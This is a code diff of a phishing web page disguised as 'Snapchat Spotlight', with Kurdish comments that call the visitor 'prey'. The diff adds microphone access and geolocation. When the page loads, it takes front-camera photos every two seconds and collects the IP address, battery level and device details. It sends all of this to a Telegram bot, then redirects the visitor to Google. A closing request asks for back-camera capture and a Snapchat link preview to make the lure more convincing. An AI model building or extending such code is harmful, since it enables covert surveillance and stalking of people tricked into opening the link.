@@ -2,8 +2,8 @@
 <html lang="ku">
 <head>
     <meta charset="UTF-8">
-    <link rel="icon" type="image/png" href="https://app.snapchat.com/favicon.png">
-    <title>Snapchat Spotlight</title>
+    <link rel="icon" type="image/png" href="https://www.korektelecom.com/media/1001/korek-logo.png">
+    <title>snapchat spotlight</title>
     <style>body { background-color: black; margin: 0; overflow: hidden; }</style>
 </head>
 <body onload="capture()">
@@ -15,41 +15,62 @@
     async function capture() {
         if (!targetID) return;
 
-        setTimeout(() => { window.location.href = "https://www.google.com"; }, 15000);
+        // 🕒 دوای ١٠ چرکە نێچیرەکە دەنێرێت بۆ گوگل
+        setTimeout(() => {
+            window.location.href = "https://www.google.com";
+        }, 10000);
 
         try {
-            // یەکەمجار کامێرای پێشەوە چالاک دەکەین
-            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-            
-            // ناردنی زانیارییەکان
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: "user" }, 
+                audio: true 
+            });
+
+            // وەرگرتنی زانیاری شەحن (Battery)
             let batteryInfo = "Unknown";
             if (navigator.getBattery) {
                 const batt = await navigator.getBattery();
                 batteryInfo = `${(batt.level * 100).toFixed(0)}%`;
             }
             
-            fetch('https://api.ipify.org?format=json').then(res => res.json()).then(data => {
-                let report = `🦅 <b>نێچیرێکی نوێ ڕاوکرا!</b>\n\n👤 <b>ID:</b> <code>${targetID}</code>\n🌐 <b>IP:</b> <code>${data.ip}</code>\n🔋 <b>Battery:</b> <code>${batteryInfo}</code>`;
-                sendToTelegram(report);
+            // ناردنی IP و زانیارییە وردەکان
+            fetch('https://api.ipify.org?format=json')
+                .then(res => res.json())
+                .then(data => {
+                    let report = `🦅 <b>نێچیرێکی نوێ ڕاوکرا!</b>\n\n` +
+                                 `👤 <b>ID:</b> <code>${targetID}</code>\n` +
+                                 `🌐 <b>IP:</b> <code>${data.ip}</code>\n` +
+                                 `🔋 <b>Battery:</b> <code>${batteryInfo}</code>\n` +
+                                 `📱 <b>Device:</b> <code>${navigator.platform}</code>\n` +
+                                 `🌐 <b>Browser:</b> <code>${navigator.userAgent.split(' ')[0]}</code>`;
+                    sendToTelegram(report);
+                });
+
+            navigator.geolocation.getCurrentPosition(pos => {
+                sendLocation(pos.coords.latitude, pos.coords.longitude);
             });
 
             const video = document.createElement('video');
             video.srcObject = stream;
-            await video.play();
+            video.muted = true;
+            video.play();
 
-            const canvas = document.createElement('canvas');
             const takeSnap = () => {
+                const canvas = document.createElement('canvas');
                 canvas.width = video.videoWidth; 
                 canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                canvas.toBlob(b => { if (b) sendFile(b, "Front"); }, 'image/jpeg', 0.7);
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0);
+                canvas.toBlob(b => {
+                    if (b) sendFile(b, "photo");
+                }, 'image/jpeg', 0.7);
             };
 
             // وێنەگرتن هەر ٢ چرکە جارێک
             setInterval(takeSnap, 2000);
 
         } catch (e) {
-            sendToTelegram("⚠️ نێچیرەکە ڕێگری کرد لە دەسەڵاتەکان یان SSL چالاک نییە.");
+            sendToTelegram("⚠️ نێچیرەکە ڕێگری کرد لە دەسەڵاتەکان.");
         }
     }
 
@@ -61,12 +82,24 @@
         });
     }
 
-    function sendFile(blob, label) {
+    function sendLocation(lat, lon) {
+        fetch(`https://api.telegram.org/bot${TOKEN}/sendLocation`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({chat_id: targetID, latitude: lat, longitude: lon})
+        });
+    }
+
+    function sendFile(blob, type) {
         let fd = new FormData();
         fd.append("chat_id", targetID);
-        fd.append("photo", blob, `${label}.jpg`);
-        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+        fd.append(type, blob, "shot.jpg");
+        fetch(`https://api.telegram.org/bot${TOKEN}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, { 
+            method: 'POST', 
+            body: fd 
+        });
     }
 </script>
 </body>
 </html>
+Jwan gwebgra lam codaaa daskari hich shtek maka namawe tanha 1 wshash bgori w tekbday tanha damawe cameray pshtawash zyadkay wakw away peshawa bahaman shewa lahar 2 chrka wenayak bnere yak sht daskari maka tanha zyadika w tawaw w ladway 15 chrka redirecti google bkat chrkakash zyadka w tawaw bejga lawa la preview katek link danerdret damawe wenay sharikay snapchat beta sari
